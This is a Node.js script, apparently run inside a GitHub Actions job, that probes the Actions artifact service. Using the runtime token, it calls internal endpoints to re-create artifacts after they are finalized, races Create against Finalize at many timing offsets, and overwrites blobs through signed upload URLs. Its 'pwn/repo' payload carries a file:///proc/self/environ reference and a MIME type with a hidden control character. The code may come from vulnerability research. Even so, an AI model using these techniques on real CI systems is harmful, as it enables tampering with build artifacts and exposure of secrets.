import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const endpoint = new URL(
  '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
  process.env.ACTIONS_RESULTS_URL,
);
const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
const client = internalArtifactTwirpClient({maxAttempts: 1});
const oddMime = 'application/json\u0085';
const body = Buffer.from(JSON.stringify({
  full_name: 'pwn/repo',
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Repo Cassette carrier',
  stargazers_count: 0,
}));
const hash = `sha256:${createHash('sha256').update(body).digest('hex')}`;
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

async function create(name, version, mimeType) {
  const started = performance.now();
  const response = await fetch(endpoint, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${runtimeToken}`,
      'content-type': 'application/json',
    },
    body: JSON.stringify({
      workflow_run_backend_id: ids.workflowRunBackendId,
      workflow_job_run_backend_id: ids.workflowJobRunBackendId,
      name,
      version,
      mime_type: mimeType,
    }),
  });
  const bodyText = await response.text();
  let value = {};
  try { value = JSON.parse(bodyText); } catch {}
  return {
    status: response.status,
    ms: Math.round(performance.now() - started),
    text: bodyText.slice(0, 160),
    url: value.signed_upload_url || value.signedUploadUrl,
  };
}

async function upload(url) {
  if (!url) return {ok: false, error: 'no-url'};
  try {
    const blob = new BlobClient(url).getBlockBlobClient();
    await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: oddMime}});
    return {ok: true};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 120)};
  }
}

async function finalize(name) {
  const started = performance.now();
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      size: String(body.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId), ms: Math.round(performance.now() - started)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180), ms: Math.round(performance.now() - started)};
  }
}

async function inspect(name) {
  try {
    const signed = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    const url = new URL(signed.signedUrl);
    const response = await fetch(url);
    const bytes = Buffer.from(await response.arrayBuffer());
    return {
      ok: true,
      status: response.status,
      rsct: url.searchParams.get('rsct'),
      ctHex: Buffer.from(response.headers.get('content-type') || '', 'latin1').toString('hex'),
      bytes: bytes.length,
      sha: createHash('sha256').update(bytes).digest('hex'),
    };
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

async function overwrite(urls) {
  return Promise.all([...new Set(urls.filter(Boolean))].map(upload));
}

// Can a same-name Create mutate a record after it has been finalized?
for (const [label, firstVersion, firstMime, lateVersion, lateMime] of [
  ['late-v6', 7, 'application/json', 6, oddMime],
  ['late-v7', 6, oddMime, 7, 'application/json'],
]) {
  const name = `${process.env.GITHUB_RUN_ID}-${label}`;
  const first = await create(name, firstVersion, firstMime);
  await upload(first.url);
  const before = await finalize(name);
  const late = await create(name, lateVersion, lateMime);
  await overwrite([first.url, late.url]);
  const view = await inspect(name);
  console.log(`LATE_RESULT ${JSON.stringify({label, name, first, before, late, view})}`);
}

// Race a late Create against Finalize in both version directions.
const delays = [-120, -60, -25, -10, 0, 10, 25, 60, 120];
const trials = [];
for (const direction of ['v7-then-v6', 'v6-then-v7']) {
  for (const delay of delays) {
    for (let repeat = 0; repeat < 2; repeat++) trials.push({direction, delay, repeat});
  }
}

for (let offset = 0; offset < trials.length; offset += 6) {
  await Promise.all(trials.slice(offset, offset + 6).map(async ({direction, delay, repeat}) => {
    const preV = direction === 'v7-then-v6' ? 7 : 6;
    const lateV = preV === 7 ? 6 : 7;
    const preMime = preV === 7 ? 'application/json' : oddMime;
    const lateMime = lateV === 7 ? 'application/json' : oddMime;
    const name = `${process.env.GITHUB_RUN_ID}-${direction}-${delay + 200}-${repeat}`;
    const pre = await create(name, preV, preMime);
    await upload(pre.url);

    let latePromise;
    let finalPromise;
    if (delay < 0) {
      latePromise = create(name, lateV, lateMime);
      await sleep(-delay);
      finalPromise = finalize(name);
    } else {
      finalPromise = finalize(name);
      await sleep(delay);
      latePromise = create(name, lateV, lateMime);
    }
    const [late, final] = await Promise.all([latePromise, finalPromise]);
    const uploads = await overwrite([pre.url, late.url]);
    const view = await inspect(name);
    console.log(`RACE_RESULT ${JSON.stringify({direction, delay, repeat, name, pre, late, final, uploads, view})}`);
  }));
}
